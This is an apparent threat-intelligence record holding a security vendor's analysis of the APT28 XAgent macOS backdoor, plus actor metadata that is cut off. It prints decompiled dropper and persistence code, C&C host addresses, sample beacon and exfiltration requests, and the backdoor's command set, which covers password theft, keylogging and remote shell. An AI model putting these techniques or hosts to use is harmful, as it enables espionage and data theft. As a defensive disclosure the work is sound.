{
    "id": "1750b2a9-72a4-4bd4-b34d-0508772c0b7e",
    "created_at": "2022-10-25T16:48:11.151879Z",
    "updated_at": "2025-03-27T02:17:11.207207Z",
    "deleted_at": null,
    "sha1_hash": "d206b485a42c611ed9fe6a0b1a3ed086e954bd30",
    "title": "Dissecting the APT28 Mac OS X Payload",
    "authors": "Bitdefender",
    "file_creation_date": "2017-02-21T15:13:17Z",
    "file_modification_date": "2017-02-21T15:13:24Z",
    "file_size": 10794697,
    "plain_text": "# Dissecting the APT28 Mac OS X Payload\n\n\n-----\n\nWhite Paper\n\n### Authors:\n\n- Tiberius Axinte, Technical Lead, Antimalware Lab\n\n- Bogdan Botezatu - senior e-threat analyst\n\n\n-----\n\nWhite Paper\n\n## A post-mortem analysis of\n Trojan.MAC.APT28 - XAgent\n\nFor the past decade, Windows users have been the main targets of consumer, for-profit cybercrime. Even now, malware on platforms such\nas Mac OS X and Linux is extremely scarce compared with the Windows threat landscape.\n\nEnter the upper tiers of malware creation: advanced persistent threats. These extremely complex, highly customized files are after targets,\nnot platforms. Attacks such as those persistently carried out by APT28 target multiple individuals in multiple organizations who run a wide\nrange of hardware and software configurations.\n\nSince the group’s emergence in 2007, Bitdefender has become familiar with the backdoors used to compromise Windows and Linux\ntargets, such as Coreshell, Jhuhugit and Azzy for the former OS or Fysbis for the latter. This year we have been able to finally isolate the\nMac OS X counterpart - the XAgent modular backdoor. This whitepaper describes our journey in dissecting the backdoor and documenting\nit piece by piece.\n\n\n-----\n\nWhite Paper\n\n## A. Context\n\nIn mid-February this year, we discovered a new Mac sample that appeared to be the Mac version of the APT28 XAgent component.\nThis backdoor component is known to have a modular structure featuring various espionage functionalities, such as key-logging, screen\ngrabbing and file exfiltration. Until now this component was only available for Windows, Linux and iOS operating systems. Though you\nmight expect this Mac version of XAgent to be the iOS version compiled to work on Mac, it is a different creation, with a much more\nadvanced feature set.\n\nThe Mac version shares multiple similarities with those designed for other operating systems. However, the Mac agent brings more\nspying capabilities such as stealing iOS backups from Mac computers, which contain messages, contacts, voicemail, call history, notes,\n**calendar and Safari data.**\n\n## B. Attack Flow\n\nLast year on 26 of September, PaloAlto identified a new Mac OS X Trojan associated with the APT28/Sofacy group that received the\n‘Komplex’ name. The Komplex Trojan is a binder with multiple parts: a dropper, a payload and a decoy pdf file.\n\n1. The Komplex Binder: Is the main executable of “roskosmos_2015-2025.app”. Its main purpose is to save a second payload(the dropper)\non the system and open the decoy pdf file pictured below.\n\nv7 = objc_msgSend(&OBJC_CLASS___NSString, “stringWithFormat:”, CFSTR(“%@/roskosmos_2015-2025.pdf”),\nv6);\nv8 = objc_msgSend(&OBJC_CLASS___NSString, “stringWithFormat:”, CFSTR(“SetFile -a E %@/\nroskosmos_2015-2025.pdf”), v6);\nv9 = objc_msgSend(&OBJC_CLASS___NSString, “stringWithFormat:”, CFSTR(“rm -rf %@/roskosmos_2015-2025.\napp”), v6);\nv10 = objc_msgSend(\n&OBJC_CLASS___NSString,\n“stringWithFormat:”,\nCFSTR(“open -a Preview.app %@/roskosmos_2015-2025.pdf”),\nv6);\nv11 = objc_msgSend(&OBJC_CLASS___NSData, “dataWithBytes:length:”, &joiner, 135028LL);\nobjc_msgSend(v11, “writeToFile:atomically:”, CFSTR(“/tmp/content”), 1LL);\nv12 = (const char *)objc_msgSend(v9, “UTF8String”);\nsystem(v12);\nsystem(“chmod 755 /tmp/content”);\nv13 = objc_msgSend(&OBJC_CLASS___NSData, “dataWithBytes:length:”, &pdf, 1584258LL);\nobjc_msgSend(v13, “writeToFile:atomically:”, v7, 1LL);\nv14 = (const char *)objc_msgSend(v8, “UTF8String”);\nsystem(v14);\nv15 = objc_msgSend(&OBJC_CLASS___NSTask, “alloc”);\nv16 = objc_msgSend(v15, “init”);\nobjc_msgSend(v16, “setLaunchPath:”, CFSTR(“/tmp/content”));\nobjc_msgSend(v16, “launch”);\nobjc_msgSend(v16, “waitUntilExit”);\nv17 = (const char *)objc_msgSend(v10, “UTF8String”);\nsystem(v17);\n\nThe Komplex Binder\n\n\n-----\n\nWhite Paper\n\nKomplex: roskosmos_2015-2025.pdf\n\n2. The Komplex Dropper: Its main functionality is to drop a third Komplex component: the final payload, and ensure persistence on the\ninfected system\nsystem(“mkdir -p /Users/Shared/.local/ &> /dev/null”);\nsystem(“mkdir -p ~/Library/LaunchAgents/ &> /dev/null”);\noff_10001B4F0(v5, &off_10001B4F0, CFSTR(“/Users/Shared/.local/kextd”), 1LL);\noff_10001B4F0(v6, &off_10001B4F0, CFSTR(“/Users/Shared/com.apple.updates.plist”), 1LL);\noff_10001B4F0(v7, &off_10001B4F0, CFSTR(“/Users/Shared/start.sh”), 1LL);\nsystem(“cp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/ &>/dev/null”);\nremove(“/Users/Shared/com.apple.updates.plist”);\nsystem(“chmod 755 /Users/Shared/.local/kextd”);\nsystem(“chmod 755 /Users/Shared/start.sh”);\n\n3. The Komplex Payload: Is the final component of the Komplex malware, with the sole purpose of downloading and executing a file, as\nrequested by the C&C servers.\n\nIn other words, Komplex is an APT28/Sofacy component that can be distributed via email, disguised as a PDF document, to establish\na foothold in a system. Once it infects the host, it can download and run the next APT28/Sofacy component, which - to the best of our\nknowledge - is the XAgent malware that forms the object of this paper.\n\nOur assumption is guided by hard evidence included in the binary. Our forensics endeavor revealed a number of indicators that made us\nthink XAgent was distributed via Komplex malware:\n\n\n-----\n\nWhite Paper\n\n|Col1|Komplex|XAgent|\n|---|---|---|\n|Project path|/Users/kazak/Desktop/Project/komplex|/Users/kazak/Desktop/Project/XAgentOSX|\n|Malware path on the infected system|/Users/Shared/.local/kextd|/Username/Library/Assistants/.local/random_name|\n|C&C|apple-iclods[.]net|apple-iclods.org|\n\n\nPossible Attack Flow\n\n\n-----\n\nWhite Paper\n\n## C. Initialization\n\nThe main module of the XAgent component is called BootXLoader. Upon starting, it calls the runLoader method, which orchestrates the\nfollowing:\n\n1. Checks if a debugger is present and, if so, the malware exits.\nv29 = 1;\nv30 = 14;\nv31 = 1;\nv32 = getpid();\nv26 = 648LL;\nif ( sysctl(&v29, 4u, &v27, &v26, 0LL, 0LL) )\ngoto LABEL_13;\n\n2. The module then waits for internet connectivity by pinging “8.8.8.8”.\n\nv7 = v2;\nv3 = 0;\nobjc_retainAutorelease(CFSTR(“8.8.8.8”));\nv4 = objc_msgSend_ptr(CFSTR(“8.8.8.8”), selRef_cStringUsingEncoding_, 1LL, v7);\nv5 = SCNetworkReachabilityCreateWithName(0LL, (__int64)v4);\nHIDWORD(v7) = 0;\nif ( (unsigned __int8)SCNetworkReachabilityGetFlags(v5, (char *)&v7 + 4) )\n{…..\n\n3. Initializes the module used for communicating with the C&C servers (called **HTTPChannel) and establishes communication**\nbetween the malware and the C&C servers.\n\nhttp_chanel_obj = objc_msgSend_ptr(classRef_HTTPChannel, selRef_alloc);\nv12 = v10(http_chanel_obj, (const char *)selRef_init);\nv13 = v10(classRef_NSThread, selRef_alloc);\nv14 = objc_msgSend_ptr(v13, selRef_initWithTarget_selector_object_, v4, selRef_postThread_, v12);\nobjc_msgSend_ptr(v14, selRef_start);\nv15 = objc_msgSend_ptr(classRef_NSThread, selRef_alloc);\nv16 = objc_msgSend_ptr(v15, selRef_initWithTarget_selector_object_, v4, selRef_getThread_, v12);\nobjc_msgSend_ptr(v16, selRef_start);\n\n4. Starts the main handle module for C&C commands and the spying modules: MainHandler\n\nv6 = objc_msgSend_ptr(classRef_MainHandler, selRef_alloc);\nv7 = objc_msgSend_ptr(v6, (const char *)selRef_init);\nv8 = objc_retain_ptr(v5, selRef_init);\nv9 = v7[4];\nv7[4] = v8;\nobjc_release_ptr(v9);\nobjc_msgSend_ptr(v7, selRef_cycleLoop);\n\n\n-----\n\nWhite Paper\n\n## D. Communication\n\nThe agent starts by selecting a C&C server from a hardcoded list, then sends a hello message and starts two main communications\nthreads:\n\n- One for receiving commands from the C&C server, in an infinite GET loop.\n\n- One for sending data to the C&C server, in an infinite POST loop.\n\n**1.** **Receiving commands from C&C server**\n\nThe agent awaits C&C commands from the server and inserts them into a command queue that will be executed in a separate thread by\nMainHandler module.\n\nC&C Servers\n\nhttp://23.227.196.215\n\nhttp://apple-iclods.org\n\nhttp://apple-checker.org\n\nhttp://apple-uptoday.org\n\nhttp://apple-search.info\n\nThe command structure, called cmdPacket, contains a command identifier, a command parameter and a size for the parameter.\n\n_struct cmdPacket {_\n_unsigned_ _char cmd;_\n_char_ *param;\n_unsigned_ _long_ _long param_size;_\n};\n\nCommand Structure\n\nThe command request to the C&C server is made via HTTP GET. It receives a base64 encoded **cmdPacket that has previously been**\nencrypted with RC4 using a hardcoded KERNEL_CRYPTO_MAIN_KEY.\n\n|HTTP GET Request|Col2|\n|---|---|\n|Method|GET|\n|Server|C&C|\n|Verbs|search/?, find/?, results/?, open/?, search/?, close/?|\n|Args|from=, itwm=, ags=, oe=, aq=, btnG=, oprnd=, itwm=, utm=, channel=|\n|Response (base64)||\n\n\n-----\n\nWhite Paper\n\nGET http://apple-iclods.org/close/?itwm=LO6iNPjpD0U8AVlLo_Hk3X9FSgAF&xzxI4=9_qwCS03APJT HTTP/1.1\nHost: apple-iclods.org\nPragma: no-cache\nConnection: keep-alive\nAccept: */*\nUser-Agent: 4fe4b9560e99e33dabca553e2eeee510\nCFNetwork/673.3 Darwin/13.4.0 (x86_64)\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\n\nExample of GET message\n\nBased on the command from the C&C server, the agent decodes and decrypts the command structure, and inserts it in a command queue\nto be executed by the MainHandler module.\n\n**Command Value** **Command char** **Module** **Action**\n\n101 e InfoOS getOsInfo\n\n102 f InfoOS getProcessList\n\n103 g RemoteShell executeShellCommand\n\n104 h RemoteShell getInstalledApps\n\n105 i RemoteShell checkBackupIosDeviceFolder\n\n106 j FileSystem downloadFileFromPath\n\n107 k FileSystem createFileInSystem\n\n108 l FileSystem executeFile\n\n109 m FileSystem deleteFile\n\n110 n ScreenShot takeScreenShot\n\n111 o ScreenShot Start screenShotLoop\n\n112 p ScreenShot Stop screenShotLoop\n\n116 t Password getFirefoxPassword\n\n117 u FTP uploadFile:urlServer:userName:password:\n\n118 v FTP stopOperation\n\n119 w FileSystem readFiles\n\nC&C Commands and Actions\n\n2. Sending information to C&C server\n\nTo exfiltrate information to the C&C server (such as screenshots, passwords, files and more), the agent uses a defined structure called\n**msgPacket.**\n\n_struct msgPacket {_\n_int agent_id;_\n_short module_id;_\n_unsigned_ _char cmd_id;_\n_char_ *data_;\n_unsigned_ _int data_size;_\n_unsigned_ _char priority;_\n};\n\nMessage Structure\n\n|Command Value|Command char|Module|Action|\n|---|---|---|---|\n|101|e|InfoOS|getOsInfo|\n|102|f|InfoOS|getProcessList|\n|103|g|RemoteShell|executeShellCommand|\n|104|h|RemoteShell|getInstalledApps|\n|105|i|RemoteShell|checkBackupIosDeviceFolder|\n|106|j|FileSystem|downloadFileFromPath|\n|107|k|FileSystem|createFileInSystem|\n|108|l|FileSystem|executeFile|\n|109|m|FileSystem|deleteFile|\n|110|n|ScreenShot|takeScreenShot|\n|111|o|ScreenShot|Start screenShotLoop|\n|112|p|ScreenShot|Stop screenShotLoop|\n|116|t|Password|getFirefoxPassword|\n|117|u|FTP|uploadFile:urlServer:userName:password:|\n|118|v|FTP|stopOperation|\n|119|w|FileSystem|readFiles|\n\n\n-----\n\nWhite Paper\n\nThe message is encrypted with RC4 with a hardcoded KERNEL_CRYPTO_MAIN_KEY. It then appends a key and a DATA_TOKEN **xor-ed**\nwith the key. Ultimately, the module encodes the result with base64 and sends it to the C&C server in a POST request.\n\n**HTTP POST Request**\n\n**Method** POST\n\n**Server** C&C\n\n**Body(base64)**\n\nSend message to server\n\nWhen starting the communication, the agent sends a hello message to the server using the POST request detailed above. This request has\nthe following HTTP body:\n\n**POST Body for Hello Message**\n\n**agent_id** IOPlatformUUID\n\n**module_id** 0x3303\n\n**cmd_id** 2\n\n**data** 0x3303#3333#3344#3355#3377#\n\n**data_size** 0xF\n\n**priority** 0x16\n\nHello message body\n```\nPOST http://23.227.196.215/watch/?itwm=7FJcXOPyN_Znh7quXfh4WAaKquNzY\n&oe=9cu2LRvfab&ags=Pi8KZsjwBh&oe=HXK20P&aq=h2RBWMQI&aq=yRRTH&i5H=MKNBXTB\nHost: 23.227.196.215\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nConnection: keep-alive\nProxy-Connection: keep-alive\nAccept: */*\nUser-Agent: 4fe4b9560e99e33dabca553e2eeee510 (unknown version) CFNetwork/673.3 Darwin/13.4.0 (x86_64)\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nContent-Length: 81\n0_a70HpSuFQI7FnNetyKM559SUEcCj-WBinNUfTdPQw0ZVTfyNXe26b6isibFp_cJLGqtiOZ9Em3iUA==\n\n```\nExample of Hello Message\n\n|HTTP POST Request|Col2|\n|---|---|\n|Method|POST|\n|Server|C&C|\n|Body(base64)||\n\n|POST Body for Hello Message|Col2|\n|---|---|\n|agent_id|IOPlatformUUID|\n|module_id|0x3303|\n|cmd_id|2|\n|data|0x3303#3333#3344#3355#3377#|\n|data_size|0xF|\n|priority|0x16|\n\n\n-----\n\nWhite Paper\n\n## E. Modules\n\nAll the important functionalities of the XAgent lie in its modules. These modules are used for communication with the C&C server, encryption\nand encoding and - most importantly - for data exfiltration and espionage.\n\n**1. BootXLoader: is the main module that handles the initialization procedures.**\n\n**2. MainHandler:** handles C&C commands and controls the other modules based on the commands it receives from the C&C.\n\n\ncase ‘e’:\n_getInfoOSX_\ncase ‘f’:\n_getProcessList_\ncase ‘g’:\n_remoteShell_\ncase ‘h’:\n_getInstalledAPP_\ncase ‘i’:\n_showBackupIosFolder_\ncase ‘j’:\n_downloadFileFromPath_\ncase ‘k’:\n_createFileInSystem_\ncase ‘l’:\n_execFile_\n\n\ncase ‘m’:\n_deletFileFromPath_\ncase ‘n’:\n_takeScreenShot_\ncase ‘o’:\n_startTakeScreenShot_\ncase ‘p’:\n_stopTakeScreenShot_\ncase ‘t’:\n_getFirefoxPassword_\ncase ‘u’:\n_ftpUpload_\ncase ‘v’:\n_ftpStop_\ncase ‘w’:\n_readFiles_\n\n\n**3. HTTPChannel : Used for continuous communication with the C&C server, for receiving commands and sending stolen data to the server.**\n\n-[HTTPChannel _enqueue:array:]_\n-[HTTPChannel _dequeue:]_\n-[HTTPChannel _clear:]_\n-[HTTPChannel _getIntegerFromProcName]_\n-[HTTPChannel _getAgentID]_\n-[HTTPChannel _createRandomSymbols:]_\n-[HTTPChannel _createEncodeToken:size_token:]_\n-[HTTPChannel _createKeyToken:]_\n-[HTTPChannel _random:end:]_\n-[HTTPChannel _generateUrlQuestion:]_\n-[HTTPChannel _generateHttpMes:data_size:size_http_mes:]_\n-[HTTPChannel _createEncodeData:size_data:size_result_data:]_\n-[HTTPChannel _takeOutPacket:::]_\n-[HTTPChannel _generateUrlParametrs:]_\n-[HTTPChannel _isActiveNetwork]_\n-[HTTPChannel _isActiveChannel]_\n-[HTTPChannel _nextServer:]_\n-[HTTPChannel _timeoutChanger:]_\n-[HTTPChannel _get]_\n-[HTTPChannel _getCryptoRawPacket]_\n-[HTTPChannel _postMessageThread]_\n-[HTTPChannel _post]_\n-[HTTPChannel _createCryptPacket]_\n-[HTTPChannel _createDecryptPacket:]_\n-[HTTPChannel _helloMessage]_\n\n\n-----\n\nWhite Paper\n\n**4. CameraShot: not implemented.**\n\n**5. Password: used to obtain passwords from Firefox browser profiles. The modules saves them to a file that will be sent to the C&C**\nservers.\n\n-[Password _writeLogMsg:]_\n-[Password _htmlLogMessage:]_\n-[Password _initNSSLib]\n-[Password _getFirefoxPassword]_\n\n**6. FileSystem: used for file management, such as: find file, delete file, execute file, create file.**\n\n-[FileSystem _getFileFromDirectory:sizeFile:]_\n-[FileSystem _createFile:bodyFile:sizeBody:]_\n-[FileSystem _executeFile:]_\n-[FileSystem _deleteFile:]_\n-[FileSystem _findFilesAtPath:withMask:andRecursion:]_\n\n**7. FTPManager: used to upload file to the server using credentials received in a previous command from the C&C server.**\n\n-[FTPManager _buffer]_\n-[FTPManager _init]_\n-[FTPManager _checkFMServer:]\n-[FTPManager _fileSizeOf:]_\n-[FTPManager _createListingArrayFromDirectoryListingData:]\n-[FTPManager _uploadData:withFileName:toServer:]\n-[FTPManager _getAgentID]_\n-[FTPManager _uploadFile:toServer:]\n-[FTPManager _createNewFolder:atServer:]\n-[FTPManager _contentsOfServer:]\n-[FTPManager _downloadFile:toDirectory:fromServer:]\n-[FTPManager _uploadData:withFileName:toServer:]_\n\n**8. InjectApp: Leverages existing higher-level vel interprocess communication mechanisms by sending an kASAppleScriptSuite/**\nkGetAEUTused event to a process to make it load Apple scripting additions. It then sends another event to inject in to the following Mac\nsystem processes:\n\n- mdworker\n\n- SystemUIServer\n\n- Dock\n\n- loginwindow\n\n- UserEventAgent\n\n-[InjectApp _injectRunningApp]_\n-[InjectApp _isInjectable:]_\n-[InjectApp _sendEventToPid:]_\n\n**9. InfoOS: Gather information from the infected computer, such as: IOPlatformUUID, process list, operating system version.**\n\n**10. Keylogger: Records any keystroke from user activity on the system.**\n\n_-[Keylogger activeAppDidChange:]_\n_-[Keylogger addNotificationForActiveApp]_\n_-[Keylogger checkAccesibility]_\n_-[Keylogger checkSpecialKey:]_\n_-[Keylogger disableLogging]_\n_-[Keylogger enableLogging]_\n_-[Keylogger initEventTapAndStartRunLoop]_\n_-[Keylogger keyPressedeventMonitor]_\n_-[Keylogger pressedKeyWithKeyCode:andModifiers:]_\n_-[Keylogger removeNotificationForActiveApp]_\n\n_[Keylogger sendLog]_\n\n\n-----\n\nWhite Paper\n\n_-[Keylogger setKeyPressedeventMonitor:]_\n_-[Keylogger start]_\n_-[Keylogger status]_\n_-[Keylogger stop]_\n\n**11. Launcher:** This module is used for generating XAgent’s file path on the infected system and to re-execute itself.\nThe malware is located in the “<UserHomedir>/Library/Assistants/.local/“ path in a random directory with a name picked from a hardcoded\nlist. Its filename is also picked from a hardcoded list.\n\n+[Launcher _randomInteger:max:]_\n+[Launcher _generateRandomPathAndName]_\n-[Launcher _reloadItSelf:]_\n-[Launcher _checkProcessName]_\n\nThe malware is located in the “<UserHomedir>/Library/Assistants/.local/“ path in a random directory with a name picked from a\nhardcoded list. Its filename is also picked from a hardcoded list.\n\nPosible Directory Path\n\n<UserHomedir>/Library/Assistants/.local/.localized/<exe_name>\n\n<UserHomedir>/Library/Assistants/.local/.com.apple.kshd/<exe_name>\n\n<UserHomedir>/Library/Assistants/.local/.com.apple.erx/<exe_name>\n\n<UserHomedir>/Library/Assistants/.local/.com.apple.fsg/<exe_name>\n\n<UserHomedir>/Library/Assistants/.local/.com.apple.ulk/<exe_name>\n\n<UserHomedir>/Library/Assistants/.local/.com.apple.wsat/<exe_name>\n\n<UserHomedir>/Library/Assistants/.local/.com.apple.sksh/<exe_name>\n\n<UserHomedir>/Library/Assistants/.local/.com.apple.ulkg/<exe_name>\n\n<UserHomedir>/Library/Assistants/.local/.com.apple.updater/<exe_name>\n\nPossible executable name <exe_name>\n\nkshd skgc mwwod rtsol\n\npaxs erx mpitil utyy\n\nexprd fcc mpiwtil rtdl\n\nrcp smm mpil rtw\n\nsync fsg mpl tew\n\nkex ulk nfod rwd\n\nzsc wsat nfsrfd Kjh\n\nscpo launchd nfd Fres\n\nddl lanchd ntfs Qas\n\nupdate lauhd rdf\n\nzsg mknod routr\n\nrep mnod route\n\n**12. RemoteShell: Used to execute remote commands received from the attacker on the infected machine. It lists installed applications as**\nwell as iPhone backups.\n\n-[RemoteShell _dispatchCommand:]_\n-[RemoteShell _start:]_\n-[RemoteShell _executeShellCommand:]_\n-[RemoteShell _getInstalledApps]_\n\n[RemoteShell checkBackupIosDeviceFolder]\n\n|Possible executable name <exe_name>|Col2|Col3|Col4|\n|---|---|---|---|\n|kshd|skgc|mwwod|rtsol|\n|paxs|erx|mpitil|utyy|\n|exprd|fcc|mpiwtil|rtdl|\n|rcp|smm|mpil|rtw|\n|sync|fsg|mpl|tew|\n|kex|ulk|nfod|rwd|\n|zsc|wsat|nfsrfd|Kjh|\n|scpo|launchd|nfd|Fres|\n|ddl|lanchd|ntfs|Qas|\n|update|lauhd|rdf||\n|zsg|mknod|routr||\n|rep|mnod|route||\n\n\n-----\n\nWhite Paper\n\n**13. Coder: Used for base64 encoding/decoding.**\n\nCoder::b64Decode(char *,uint,uint *,char *)\nCoder::base64UrlEncode(uchar *,uint,uint *)\nCoder::b64Encode(uchar *,uint,uint *,char *)\nCoder::base64Decode(char *,uint,uint *)\nCoder::base64Encode(uchar *,uint,uint *)\n\n**14. Cryptor: The cryptographic engine used to encrypt communication with the C&C server.**\n\nCryptoContainer::cryptRc4(uchar *,uint,uint)\nCryptoContainer::decryptData(uchar *,uint,uint *)\n\nMac **Linux**\n\nHTTPChannel HTTPChannel\n\nMainHandler AgentKernel\n\nCameraShot\n\nFileObserver\n\nFileSystem FileSystem\n\nFMServer\n\nFTP\n\nFTPManager\n\nInjectApp\n\nKeylogger Keylogger\n\nLauncher\n\nPassword\n\nRemoteShell RemoteShell\n\nScreenShot\n\nCoder Coder\n\nCryptor Cryptor\n\nModules comparison with Linux\n\n|Mac|Linux|\n|---|---|\n|HTTPChannel|HTTPChannel|\n|MainHandler|AgentKernel|\n|CameraShot||\n|FileObserver||\n|FileSystem|FileSystem|\n|FMServer||\n|FTP||\n|FTPManager||\n|InjectApp||\n|Keylogger|Keylogger|\n|Launcher||\n|Password||\n|RemoteShell|RemoteShell|\n|ScreenShot||\n|Coder|Coder|\n|Cryptor|Cryptor|\n\n\n-----\n\nWhite Paper\n\n## F. Conclusions\n\nState-sponsored threat actors go to great lengths to reach their goals. With clear objectives and generous research & development budgets,\nAPT groups get the job done. It was just a matter of time until the APT28 group realized they were missing out on a serious cyber-weapon\nto target Mac OS X users.\n\nThe discovery of the XAgent module once again reasserts the need for organizations to tackle computer security in a unified manner,\nregardless of the operating system mix they have deployed. Missing out on Macs or mobile phones because they are «inherently secure»\ngives determined attacks the opportunity they need to subvert individual devices and take over entire networks to exfiltrate information for\nmonths, if not years.\n\n\n-----\n\nBitdefender is a global security technology company that delivers solutions in more than 100 countries through a network of value-added alliances, distributors\n\nand reseller partners. Since 2001, Bitdefender has consistently produced award-winning business and consumer security technology, and is a leading security\n\nprovider in virtualization and cloud technologies. Through R&D, alliances and partnership teams, Bitdefender has elevated the highest standards of security\n\nexcellence in both its number-one-ranked technology and its strategic alliances with the world’s leading virtualization and cloud technology providers. More\n\n\ninformation is available at\n\n\nhttp://www.bitdefender.com/\n\nAll Rights Reserved. © 2015 Bitdefender. All trademarks, trade names, and products referenced herein are property of their respective owners.\n\nFOR MORE INFORMATION VISIT: enterprise.bitdefender.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/l7n781ig6n8wlf1aff5hgwbh4qoi5jqq",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2017/2017.02.23.APT28_Mac_OS_X_Payload/Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web.pdf",
        "https://download.bitdefender.com/resources/files/News/CaseStudies/study/143/Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web.pdf"
    ],
    "report_names": [
        "Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web(02-23-2017)",
        "Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web",
        "Bitdefender-Whitepaper-APT-Mac-A4-en-EN-web.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
